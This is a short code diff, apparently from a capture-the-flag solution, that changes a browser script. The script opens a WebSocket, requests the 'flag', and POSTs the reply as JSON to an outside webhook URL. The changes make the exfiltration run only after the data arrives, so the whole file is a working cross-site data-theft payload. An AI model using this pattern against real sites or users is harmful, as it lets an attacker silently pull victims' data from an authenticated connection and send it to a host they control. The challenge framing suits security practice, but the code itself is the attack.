@@ -19,35 +19,30 @@
         // Create a new WebSocket connection
         const socket = new WebSocket(websocketURL);
 
-        // Send POST request immediately after the WebSocket is created
-        
+        let flag = "";  // Declare a variable to store the received message
 
+        // Open WebSocket connection and send "flag" when connected
         socket.addEventListener("open", (event) => {
             socket.send("flag");
         });
 
-        let flag = "";  // Declare a variable to store the received message
-
-         socket.onmessage = (event) => {
+        // Handle message received from WebSocket
+        socket.onmessage = (event) => {
             flag = event.data;  // Store the received message in the 'flag' variable
             console.log("Received message:", flag);
 
             // Send the POST request after the WebSocket message is received
-            
+            sendPostToWebhook(flag);
 
-            // Close the WebSocket connection after the first message
+            // Close the WebSocket connection after receiving the message
             socket.close();
-            
         };
-        sendPostToWebhook();  
-        
 
-        
-
-        
-
-        function sendPostToWebhook() {
+        function sendPostToWebhook(flag) {
             console.log("Sending POST request to Webhook");
+
+            // Create the payload with the flag
+            const payload = { flag: flag };
 
             // Send POST request to Webhook with the flag
             fetch(webhookURL, {
@@ -55,7 +50,7 @@
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify(payload)  // Send the flag directly
+                body: JSON.stringify(payload)  // Send the flag in the payload
             })
             .then(response => {
                 if (response.ok) {
